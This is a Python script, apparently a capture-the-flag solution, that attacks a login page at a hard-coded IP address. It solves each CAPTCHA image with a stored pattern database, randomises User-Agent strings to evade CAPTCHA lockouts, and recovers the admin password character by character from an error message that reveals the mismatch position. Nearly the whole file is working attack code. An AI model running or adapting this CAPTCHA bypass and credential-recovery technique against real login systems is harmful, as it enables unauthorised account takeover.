import requests
import pickle
from PIL import Image
from captcha import recognize
import string
import random
import re

login_url = "http://13.48.148.114:50000/login"
captcha_url = "http://13.48.148.114:50000/captcha.png"
username = 'admin'
known = 'keep going'
password = known + '?' * 0x10
#table = ' ' + string.printable[:-6]
table = ' abcdefghijklmnopqrstuvwxyz'
#table = [chr(c) for c in range(0x100)]

def gen_ua():
    table = list(string.ascii_lowercase * 4)
    random.shuffle(table)
    return 'X' + ''.join(table)

if __name__ == '__main__':
    with open("char.db", "rb") as f:
        pattern = pickle.load(f)

    ua = gen_ua()
    ofs = len(known)
    while True:
        i = 0
        while i < len(table):
            char = table[i]
            
            # resolve captcha
            r = requests.get(captcha_url,
                             headers={'User-Agent': ua})
            session = r.cookies['session']
            with open("sample.png", "wb") as f:
                f.write(r.content)

            img = Image.open("sample.png").convert('L')
            captcha = recognize(img, pattern)

            # login request
            password = password[:ofs] + char + password[ofs+1:]
            print(captcha, password)
            r = requests.post(login_url,
                              data={'username':username,
                                    'password':password,
                                    'captcha':captcha},
                              headers={'User-Agent': ua,
                                       'Origin': 'http://13.48.148.114:50000',
                                       'Referer': login_url},
                              cookies={'session': session})
            if 'Due to our zero' in r.text:
                # captcha fail
                ua = gen_ua()
                print("Wrong CAPTCHA...")
                continue
            elif 'unknown error' in r.text:
                print(r.text)
                print(password)
                exit()
            else:
                x = re.findall("missmatch at pos (\d+) ", r.text)
                if x:
                    if ofs < int(x[0]):
                        print("[!] Found {}th character: {}".format(ofs, password))
                        print(r.text)
                        ofs += 1
                        break
                    elif ofs > int(x[0]):
                        print("[!] Something is wrong......")
                else:
                    print(r.text)
                    exit()

            i += 1
        else:
            print("Not found :(")
            exit(1)
